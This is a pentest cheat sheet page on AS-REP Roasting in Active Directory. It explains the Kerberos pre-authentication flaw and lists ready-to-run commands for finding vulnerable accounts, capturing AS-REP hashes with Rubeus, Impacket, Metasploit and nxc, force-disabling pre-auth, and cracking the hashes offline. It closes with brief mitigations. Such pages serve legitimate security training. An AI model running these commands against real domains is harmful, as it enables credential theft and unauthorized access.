# AS-REP Roasting

{% hint style="info" %}
* AS-REP Roasting dumps user account hashes that have Kerberos pre-authentication disabled. Unlike Kerberoasting, these users do not need to be service accounts—the only requirement is that the “Do not require Kerberos pre-authentication” flag (UF\_DONT\_REQUIRE\_PREAUTH) is set on the user account.
* During standard Kerberos authentication, the user’s hash encrypts a timestamp, which the Key Distribution Center (KDC) decrypts to verify the user’s identity. However, if pre-authentication is disabled, the KDC skips this verification step and returns an encrypted AS-REP blob without confirming the user’s identity. This blob can then be captured and cracked offline to recover the user’s password.

<p align="center"><img src="../../../../.gitbook/assets/AS-REP Roasting.png" alt=""></p>
{% endhint %}

### Identifying Vulnerable Accounts

* **Tools**
  * _**PowerView**_
    * `Get-DomainUser -PreauthNotRequired -Verbose`
    * `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`
  * _**ADModule**_
    * `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True}  -Properties DoesNotRequirePreAuth`
  * _**NXC**_
    * `nxc ldap <DC-IP> -u "users.txt" -p '' -k`

### Capturing Hashes

* [Rubeus](https://github.com/GhostPack/Rubeus)
  * `Rubeus.exe asreproast`&#x20;
  * `Rubeus.exe asreproast /user:<username> /outfile:asrephashes.txt`
  * `Rubeus.exe asreproast /user:<username> /nowrap /format:hashcat`
* [Impacket’s GetNPUsers.py](https://github.com/fortra/impacket)&#x20;
  * &#x20;`GetNPUsers.py <domain>/ -dc-ip <ip> -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass`&#x20;
* [Kerbrute](https://github.com/ropnop/kerbrute)
  * `kerbrute userenum --dc <IP> -d <domain> wordlist.txt`
* **Metasploit**
  * `use auxiliary/gather/asrep`    \
    `set rhosts <DC-IP>`    \
    `set domain <value>`    \
    `set user_file users.txt`    \
    `run`
* **NXC**
  * `nxc ldap <DC-IP> -u "users.txt" -p '' --asreproast output.txt`

### Force Disable Kerberos Preauth

* If an attacker has `GenericWrite` or `GenericAll` permissions over an account, they can enable this attribute and obtain the AS-REP ticket
* _**PowerView**_
  * ``Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} ` -Verbose``

### Cracking Password Hashes and Accessing the Network

* **Tools**
  * [Hashcat](https://hashcat.net/hashcat/)
    * &#x20;`hashcat -m 18200 hashes.txt wordlist.txt`&#x20;
  * JohnTheRipper
    * `john.exe --wordlist=pass.txt asrephashes.txt`
* Authenticate as these compromised users, request Kerberos tickets, or directly access other network resources.

### Mitigations

* Enforce Kerberos pre-authentication for all user accounts
* Strong, complex passwords slow down offline cracking
* Monitor anomalous AS-REP requests on the KDC

### Key Takeaways

* AS-REP Roasting is a low-noise, unauthenticated Kerberos attack
* Rubeus simplifies discovery on Windows; GetNPUsers.py offers manual control
* Success depends on password strength and proper pre-auth enforcement

### Tools

* [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\))
